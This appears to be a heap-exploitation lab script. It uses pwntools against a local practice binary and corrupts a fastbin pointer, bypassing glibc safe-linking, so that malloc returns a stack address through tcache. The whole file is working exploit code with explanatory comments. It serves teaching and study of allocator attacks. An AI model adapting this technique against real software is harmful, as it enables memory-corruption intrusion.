#!/usr/bin/env python3

import pwn
import sys

BIN_FILENAME = "/lab/bin/playground"

gdbscript = """
    set resolve-heap-via-heuristic force
    continue
"""


def protect_ptr(heap_addr, ptr):
    return (heap_addr >> 12) ^ ptr


def exploit(p):
    # get leaks
    p.recvuntil(b"[*] stack ")
    stack_ptr = int(p.recvline()[:-1], 16)
    print(f"stack_ptr: {stack_ptr:#x}")
    p.recvuntil(b"[*] global ")
    data_ptr = int(p.recvline()[:-1], 16)
    print(f"data_ptr: {data_ptr:#x}")

    # prepare enough allocations to fill
    # tcache and get to fastbin
    ptrs = []
    for _ in range(14):
        p.clean()
        p.sendline(b"malloc 0x10")
        p.recvuntil(b"[*] ")
        alloc = int(p.recvline()[:-1], 16)
        ptrs.append(alloc)

    # fill tcache bin 0x20
    for i in range(7):
        p.sendline(f"free {ptrs[i]:#x}".encode())

    # get heap page to bypass safe linking
    heap_page = ptrs[0] & ~0xfff
    print(f"heap page: {heap_page:#x}")

    # the allocation to corrupt
    target_alloc = ptrs[7]
    print(f"target allocation to corrupt is {target_alloc:#x}")

    # this is going to fastbin bin 0x20
    p.sendline(f"free {target_alloc:#x}".encode())

    # fake fd pointing to the stack
    fake_fd = protect_ptr(heap_page, stack_ptr)
    p.sendline(f"write {target_alloc:#x} 0x8".encode())
    p.sendline(pwn.p64(fake_fd))

    # free 6 more fastbin chunks. as part of the optimization
    # to move fastbin chunks into tcache, we don't want glibc
    # to continue reading after our fake chunk, so we place
    # exactly 7 chunks in fastbins, the max capacity of tcache
    for i in range(8, 14):
        p.sendline(f"free {ptrs[i]:#x}".encode())
    # at this point fastbin is:
    # 0x20: alloc13 -> alloc12 -> alloc11 -> alloc10 -> alloc9 -> alloc8 -> alloc7 -> stack_addr

    # empty tcache bin 0x20
    for i in range(7):
        p.sendline(f"malloc 0x10".encode())

    # tcache is now empty, next alloc will be resolved
    # from the fastbin. it will also move next 7 chunks 
    # from fastbin into tcache in reverse order. 
    # this will have some side effects:
    # - the next allocation after this one will be
    #   our malicious stack poitner
    # - stack will be overwritten with fd and key
    p.sendline(b"malloc 0x10")
    # at this point tcache is:
    # 0x20: stack_addr -> alloc7 -> alloc8 -> alloc9 -> alloc10 -> alloc11 -> alloc12

    print(f"here the allocator overwrote {stack_ptr+0x10:#x} and {stack_ptr+0x18:#x}" +
            " with some large unsigned numbers.")
    input("press any key to continue")

    # the next allocation is the stack address
    p.clean()
    p.sendline(b"malloc 0x10")
    p.recvuntil(b"[*] ")
    ptr = int(p.recvline()[:-1], 16)
    print(f"done. malloc returned a stack address from tcache: {ptr:#x}")


def main():
    if "--gdb" in sys.argv:
        p = pwn.gdb.debug(
            BIN_FILENAME,
            env={},
            gdbscript=gdbscript
        )
    else:
        p = pwn.process(BIN_FILENAME, env={})

    exploit(p)
    p.interactive()


if __name__ == "__main__":
    main()
